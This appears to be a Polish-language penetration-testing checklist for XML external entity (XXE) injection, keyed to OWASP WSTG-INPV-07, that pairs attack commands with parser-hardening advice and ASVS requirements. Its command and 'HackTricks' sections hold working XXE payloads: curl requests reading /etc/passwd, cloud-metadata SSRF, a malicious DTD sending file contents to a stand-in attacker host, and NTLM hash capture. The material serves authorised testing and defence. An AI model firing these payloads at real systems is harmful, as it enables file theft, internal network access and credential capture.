# WSTG-INPV-07 — Testing for XML Injection (XXE)

## Cele

- Identify XML injection points
- Assess the types of exploits that can be attained and their severities

## KOMENDY

### Testowanie XXE - odczyt plikow

```bash
curl -X POST "https://TARGET/api/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

```

### XXE blind (Out-of-Band)

```bash
curl -X POST "https://TARGET/api/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_SERVER/xxe">]><root>&xxe;</root>'

```

### XXE z parametrycznymi entities

```bash
curl -X POST "https://TARGET/api/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/evil.dtd">%xxe;]><root>test</root>'

```

### XXE SSRF

```bash
curl -X POST "https://TARGET/api/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'

```

### Test JSON to XML conversion

```bash
curl -X POST "https://TARGET/api/data" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><root>test</root>'

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings XXE payloads

```bash
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XXE Injection/Intruders/XXE_Fuzzing.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XXE Injection/Intruders/xml-attacks.txt

ffuf -u "https://TARGET/api/xml" -X POST -H "Content-Type: application/xml" -d "FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/XXE Injection/Intruders/XXE_Fuzzing.txt" -mc all -o output_ffuf_xxe.json

```

### SecLists XXE

```bash
ffuf -u "https://TARGET/api/xml" -X POST -d "FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/XXE-Fuzzing.txt -mc all -o output_ffuf_seclists_xxe.json

```

### SecLists XML Fuzz

```bash
ffuf -u "https://TARGET/api/xml" -X POST -d "FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/XML-FUZZ.txt -mc all -o output_ffuf_xml_fuzz.json

```

### fuzzdb XML

```bash
# Referencja: Desktop/WSTG/fuzzdb-master/attack/xml/

```

### PayloadsAllTheThings szczegolowa dokumentacja

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/XXE Injection/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj endpointy przyjmujace XML (Content-Type: application/xml)
2. Sprawdz file upload (DOCX, XLSX, SVG - zawieraja XML)
3. Testuj XXE do odczytu /etc/passwd lub C:\Windows\win.ini
4. Testuj blind XXE z zewnetrznym serwerem (Burp Collaborator)
5. Sprawdz SSRF via XXE (dostep do metadanych chmury)
6. Testuj wstrzykiwanie w SOAP/WSDL endpointach
7. Sprawdz czy Content-Type: application/json mozna zmienic na XML


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — XML_External_Entity_Prevention_Cheat_Sheet.md, XML_Security_Cheat_Sheet.md

### Minimalne reguly hardening XML parsera

- **Wylacz DOCTYPE** calkowicie — to najskuteczniejsza obrona: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
- Wylacz external entities i external DTD loading
- Wlacz secure processing mode
- Wylacz XInclude
- Ogranicz entity expansion count (obrona przed Billion Laughs DoS)
- NIGDY nie parsuj niezaufanego XML z domyslnymi ustawieniami

### Matryca wplywu brakujacych zabezpieczen

- DOCTYPE nie wylaczony → standardowe XXE w pelni eksploatowalne
- External entities wlaczone → SSRF, eksfiltracja plikow, skanowanie portow
- External DTD loading dozwolone → Blind XXE, ukryte ataki SSRF
- Brak limitow expansion → Billion Laughs DoS (wyzerowanie pamieci)
- XInclude wlaczony → odczyt plikow lokalnych + SSRF
- Schema validation fetchuje zewnetrzne URL → niechciane requesty wychodzace

### Konfiguracja bezpieczna wg jezyka

- **Java (DocumentBuilderFactory)**:
  ```
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  ```
- **C/C++ (libxml2)**: NIE uzywaj flag `XML_PARSE_NOENT` ani `XML_PARSE_DTDLOAD` (od libxml2 v2.9 XXE domyslnie wylaczone)
- **C++ (libxerces-c)**: `parser->setDisableDefaultEntityResolution(true);`
- **PHP**: `libxml_disable_entity_loader(true);` (PHP < 8.0); w PHP 8.0+ external entities domyslnie wylaczone
- **Python (lxml)**: `parser = etree.XMLParser(resolve_entities=False, no_network=True)`
- **.NET**: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit;`

### Formaty oparte na XML — ukryte wektory XXE

- **SVG**: moze zawierac `<script>` i XXE payloady — waliduj przed renderowaniem
- **DOCX/XLSX/PPTX**: sa archiwami ZIP z plikami XML — XXE w content.xml/[Content_Types].xml
- **SOAP/WSDL**: endpointy SOAP akceptuja XML — testuj XXE w SOAP body
- **RSS/Atom feeds**: parsowanie feedow moze byc podatne na XXE
- Content-Type manipulation: zmien `application/json` na `application/xml` — sprawdz czy backend akceptuje

### Dodatkowe rekomendacje

- Uzywaj mniej zlozonego formatu (**JSON**) zamiast XML gdzie mozliwe
- Waliduj XML przeciw schema (XSD) PRZED przetworzeniem
- Uzyj Semgrep rules do wykrywania niebezpiecznych konfiguracji parserow XML w kodzie
- Monitoruj wychodzace polaczenia sieciowe — XXE czesto generuje requesty do zewnetrznych serwerow

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.5.1 | Safe Deserialization | Verify that the application configures XML parsers to use a restrictive configuration and that unsafe features such as resolving external entities are disabled to prevent XML eXternal Entity (XXE) attacks. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.5.2 | Safe Deserialization | Verify that deserialization of untrusted data enforces safe input handling, such as using an allowlist of object types or restricting client-defined object types, to prevent deserialization attacks. Deserialization mechanisms that are explicitly defined as insecure must not be used with untrusted input. |

### L3 (Zaawansowany)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.5.3 | Safe Deserialization | Verify that different parsers used in the application for the same data type (e.g., JSON parsers, XML parsers, URL parsers), perform parsing in a consistent way and use the same character encoding mechanism to avoid issues such as JSON Interoperability vulnerabilities or different URI or file parsing behavior being exploited in Remote File Inclusion (RFI) or Server-side Request Forgery (SSRF) attacks. |


---

## HackTricks Tips

### OOB Exfil (blind XXE)

Hostuj `malicious.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval; %exfil;
```
Dla plików wieloliniowych użyj FTP exfil server.

### Error-based (bez OOB) — System DTD Repurpose

Gdy blokowane połączenia zewnętrzne — redefine entity z lokalnego DTD:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x25; error SYSTEM &apos;file:///x/%file;&apos;>">
    %eval; %error;'>
  %local_dtd;
]>
```
Szukaj exploitowalnych DTD: `dtd-finder` (GoSecure).

### XInclude (bez kontroli DOCTYPE)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### Ukryte powierzchnie ataku

- **SVG upload**: `<image xlink:href="file:///etc/hostname">`
- **DOCX/XLSX**: unzip → inject XXE do `word/document.xml` → rezip
- **jar:// (Java)**: slow HTTP server utrzymuje temp file na dysku → chain z LFI
- **NTLM capture (Windows)**: `<!ENTITY xxe SYSTEM 'file:////attackerIP/share/x.jpg'>` + Responder
- **Java directory listing**: `<!ENTITY xxe SYSTEM "file:///etc/">` — zwraca listę plików
